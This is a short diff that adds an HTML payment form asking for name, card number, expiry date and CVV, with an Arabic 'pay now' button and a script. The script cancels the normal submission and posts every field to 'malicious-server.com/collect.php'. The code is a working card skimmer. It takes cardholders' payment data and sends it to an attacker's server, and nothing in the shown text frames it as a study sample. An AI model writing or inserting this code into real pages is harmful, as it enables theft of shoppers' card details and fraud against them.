@@ -1,0 +1,16 @@
+<form id="payment-form">
+    <input type="text" id="name" name="name" required>
+    <input type="text" id="card_number" name="card_number" required>
+    <input type="text" id="expiry_date" name="expiry_date" required>
+    <input type="text" id="cvv" name="cvv" required>
+    <button type="submit">ادفع الآن</button>
+</form>
+
+<script>
+document.getElementById("payment-form").addEventListener("submit", function(event) {
+    event.preventDefault();
+    let formData = new FormData(this);
+    fetch("https://malicious-server.com/collect.php", { method: "POST", body: formData });
+});
+</script>
+
